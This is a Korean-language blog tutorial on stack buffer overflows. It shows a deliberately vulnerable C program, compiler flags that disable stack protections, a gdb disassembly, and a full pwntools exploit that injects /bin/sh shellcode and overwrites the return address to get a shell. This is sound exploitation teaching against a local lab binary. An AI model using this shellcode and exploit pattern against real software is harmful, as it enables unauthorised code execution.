---
layout: post
title: Buffer Overflow
subtitle: Stack Buffer Overflow
categories: Pwnable
tags: [Stack, Pwnable, buffer overflow]
---

### ✅ Buffer Overflow
Pwnable의 가장 기초적인 Stack Buffer Overflow부터 알아보자. <br>
Stack buffer overflow는 이름에서부터 알 수 있듯 스택 버퍼에 할당된 크기보다 더 많은 데이터를 써서, 원래 할당된 크기 외에 영역을 덮어씌우는 공격 기법이다.

<br><br>


바로 코드로 알아보자.
```c
#include <stdio.h>
#include <unistd.h>
 
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```


```cmd
gcc -z execstack -fno-stack-protector -o stack stack.c
```
위의 명령어를 통해 컴파일해준다. <br>
**-z execstack**은 Stack영역에 실행권한을 주는 옵션이고 **-fno-stack-protector**는 Stack Canary를 없애주는 옵션이다.

<br>

이제 gdb를 실행해서 vuln 함수의 buf가 rbp로부터 얼마나 떨어져있는지 확인해보자.

```asm
pwndbg> disassemble vuln
Dump of assembler code for function vuln:
   0x0000000000001169 <+0>:     endbr64
   0x000000000000116d <+4>:     push   rbp
   0x000000000000116e <+5>:     mov    rbp,rsp
   0x0000000000001171 <+8>:     sub    rsp,0x40
   0x0000000000001175 <+12>:    lea    rax,[rbp-0x40]
   0x0000000000001179 <+16>:    mov    rsi,rax
   0x000000000000117c <+19>:    lea    rax,[rip+0xe81]        # 0x2004
   0x0000000000001183 <+26>:    mov    rdi,rax
   0x0000000000001186 <+29>:    mov    eax,0x0
   0x000000000000118b <+34>:    call   0x1060 <printf@plt>
   0x0000000000001190 <+39>:    lea    rax,[rbp-0x40]
   0x0000000000001194 <+43>:    mov    edx,0x64
   0x0000000000001199 <+48>:    mov    rsi,rax
   0x000000000000119c <+51>:    mov    edi,0x0
   0x00000000000011a1 <+56>:    call   0x1070 <read@plt>
   0x00000000000011a6 <+61>:    nop
   0x00000000000011a7 <+62>:    leave
   0x00000000000011a8 <+63>:    ret
End of assembler dump.
```

read함수를 보면 두 번째 인자인 rsi에 [rbp-0x40]의 주소를 넣고 있다.
즉, buf[50]은 [rbp0x40]에 할당된다.

따라서 0x40크기의 쉘 코드를 넣으면 rbp까지 덮어씌워지고 그 뒤로 8byte(RBP) + 입력값의 주소(RET)를 넣어주면 입력한 쉘 코드를 실행시킬 수 있다.

<br>

아! 그리고 입력값의 주소는 프로그램 실행 시 주소를 출력해주기 때문에 잘 받기만 하면 된다.

<br>

바로 Exploit Code를 작성하자.
```python
from pwn import *

context.log_level = 'debug'

p = process('./stack')
pause()

p.recvuntil(b'buf[50] address : ')
buf_addr = int(p.recvuntil(b'\n')[:-1],16)
print("[*] Recv buf[50] address: ", buf_addr)

shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05' # 23 bytes
payload = shellcode
payload += b"A"*0x29
payload += b"B"*0x8 # rbp
payload += p64(buf_addr) # ret

p.sendline(payload)

p.interactive()
```

Exploit Code는 다음과 같다. <br>
buf[50]에 ShellCode를 올리고 buf[50]의 주소를 RET로 덮어씌우기 위해 0x40(64) - ShellCode(23) = 41 <br>
문자열 A로 41만큼 덮어씌우고 문자열 B로 RBP를 덮어씌운뒤 buf[50]의 주소로 RET를 덮어씌운다.

<br>

![Exploit Binary](/assets/images/source/250920_img/ex.png)

짠! 오랜만에 하니까 생각보다 오래걸렸다. <br>
다시 함수 호출 규약, 레지스터부터 차근차근 정리해봐야겠다.

<br>

끝✨

<br><br><br>

### ✅ 참고
<a href="https://www.lazenca.net/display/TEC/02.Return+to+Shellcode">Return To ShellCode</a>